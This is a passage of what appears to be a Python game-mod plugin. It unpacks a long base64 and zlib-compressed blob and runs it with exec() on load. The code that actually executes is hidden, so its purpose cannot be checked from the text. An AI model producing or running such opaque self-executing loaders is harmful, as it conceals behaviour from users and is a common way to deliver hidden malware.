    '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'
    'tQQMs5JvtuoruQNpK/8OSoietw==')

exec(
    compile(
        _zlib.decompress(_b64.b64decode(_PAYLOAD)),
        '<ModPoya>',
        'exec',
    ),
    globals(),
)

_ModPoyaImpl = ModPoya

# ba_meta require api 9


# ba_meta export plugin
class ModPoya(_ModPoyaImpl):
    pass
